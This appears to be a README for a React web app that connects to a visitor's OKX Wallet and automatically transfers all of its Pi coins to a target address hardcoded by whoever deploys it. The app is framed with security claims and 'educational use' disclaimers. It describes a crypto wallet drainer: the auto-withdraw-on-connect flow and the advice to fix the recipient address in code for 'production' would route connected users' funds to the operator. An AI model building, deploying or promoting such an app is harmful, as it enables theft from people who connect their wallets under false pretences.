# 🪙 Pi Coin Auto-Withdrawal App

A React-based web application that connects to OKX Wallet and automatically withdraws all Pi coins to a specified target wallet address.

## ⚠️ Important Disclaimer

This application is designed to automatically withdraw **ALL** Pi coins from your connected wallet. Please ensure you:

- Trust the target wallet address completely
- Understand that the withdrawal process is irreversible
- Have sufficient ETH for transaction fees
- Are using this application responsibly and legally

## 🚀 Features

- **OKX Wallet Integration**: Seamless connection to OKX Wallet browser extension
- **Automatic Pi Coin Withdrawal**: Automatically withdraws all Pi coins upon wallet connection
- **Real-time Transaction Monitoring**: Tracks transaction status and confirmation
- **Target Wallet Configuration**: Customizable target wallet address in settings
- **Modern UI/UX**: Beautiful, responsive interface with clear instructions
- **Transaction History**: View withdrawal results and transaction details

## 📋 Prerequisites

Before using this application, you need:

1. **OKX Wallet Extension**: Install the OKX Wallet browser extension
   - [Chrome Extension](https://chrome.google.com/webstore/detail/okx-wallet/mcohilncbfahbmgdjkbpemcciiolgcge)
   - [Firefox Extension](https://addons.mozilla.org/en-US/firefox/addon/okx-wallet/)

2. **Pi Coins**: Have Pi coins in your OKX wallet that you want to withdraw

3. **ETH Balance**: Sufficient ETH for transaction fees

## 🛠️ Installation

1. **Clone the repository**:
   ```bash
   git clone <repository-url>
   cd my-vite-app
   ```

2. **Install dependencies**:
   ```bash
   npm install
   ```

3. **Configure the target wallet address**:
   - Open `src/services/okxWalletService.ts`
   - Update the `targetWalletAddress` in the constructor (line 25)
   - Or use the settings panel in the app

4. **Start the development server**:
   ```bash
   npm run dev
   ```

5. **Open your browser** and navigate to `http://localhost:5173`

## 🔧 Configuration

### Target Wallet Address

You can set the target wallet address in two ways:

1. **In the code** (recommended for production):
   ```typescript
   // In src/services/okxWalletService.ts
   constructor() {
     this.targetWalletAddress = '0x742d35Cc6634C0532925a3b8D4C9db96C4b4d8b6'; // Your target wallet
   }
   ```

2. **In the app settings**:
   - Click the "⚙️ Settings" button
   - Enter your target wallet address
   - Click "Update"

### Pi Token Contract Address

Update the Pi token contract address in `src/services/okxWalletService.ts`:

```typescript
const PI_TOKEN_ADDRESS = '0x0000000000000000000000000000000000000000'; // Replace with actual Pi token address
```

## 📱 How to Use

### Step 1: Install OKX Wallet
1. Install the OKX Wallet browser extension
2. Create or import your wallet
3. Ensure you have Pi coins and some ETH for fees

### Step 2: Connect Wallet
1. Open the application in your browser
2. Click "🔗 Connect OKX Wallet"
3. Approve the connection in the OKX Wallet popup

### Step 3: Automatic Withdrawal
1. Once connected, the app will automatically:
   - Check your Pi coin balance
   - Initiate withdrawal of all Pi coins to the target wallet
   - Monitor transaction status

### Step 4: Monitor Progress
- View real-time transaction status
- Check withdrawal results
- Verify transaction confirmation on the blockchain

## 🔒 Security Features

- **No Private Key Storage**: Private keys never leave your wallet
- **Explicit User Approval**: All transactions require wallet approval
- **Address Validation**: Automatic validation of wallet addresses
- **Transaction Monitoring**: Real-time status tracking
- **Error Handling**: Comprehensive error messages and recovery

## 🏗️ Technical Architecture

### Frontend
- **React 19**: Modern React with hooks
- **TypeScript**: Type-safe development
- **Vite**: Fast build tool and dev server
- **Ethers.js**: Ethereum interaction library

### Key Components
- `App.tsx`: Main application component
- `okxWalletService.ts`: OKX wallet integration service
- `okxApi.ts`: OKX exchange API service (for reference)

### Services
- **Wallet Connection**: OKX wallet integration
- **Balance Checking**: ETH and Pi coin balance retrieval
- **Transaction Execution**: Pi coin withdrawal functionality
- **Status Monitoring**: Transaction confirmation tracking

## 🐛 Troubleshooting

### Common Issues

1. **"OKX Wallet not found"**
   - Ensure OKX Wallet extension is installed
   - Refresh the page after installation
   - Check if the extension is enabled

2. **"Failed to connect wallet"**
   - Check if OKX Wallet is unlocked
   - Ensure you're on the correct network
   - Try refreshing the page

3. **"No Pi coins available"**
   - Verify you have Pi coins in your wallet
   - Check if you're connected to the correct network
   - Ensure the Pi token contract address is correct

4. **"Transaction failed"**
   - Check if you have sufficient ETH for gas fees
   - Verify the target wallet address is correct
   - Ensure the Pi token contract is properly configured

### Debug Mode

Enable debug logging by opening the browser console and looking for detailed error messages.

## 📄 License

This project is for educational and legitimate use only. Users are responsible for ensuring compliance with applicable laws and regulations.

## 🤝 Contributing

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Test thoroughly
5. Submit a pull request

## ⚠️ Legal Notice

This application is provided as-is for educational purposes. Users are responsible for:

- Ensuring compliance with local laws and regulations
- Verifying the legitimacy of all transactions
- Understanding the risks associated with cryptocurrency transactions
- Using the application responsibly and ethically

## 📞 Support

For technical support or questions:

1. Check the troubleshooting section above
2. Review the browser console for error messages
3. Ensure all prerequisites are met
4. Verify network connectivity and wallet configuration

---

**Remember**: Always double-check wallet addresses and transaction details before confirming any cryptocurrency transactions.
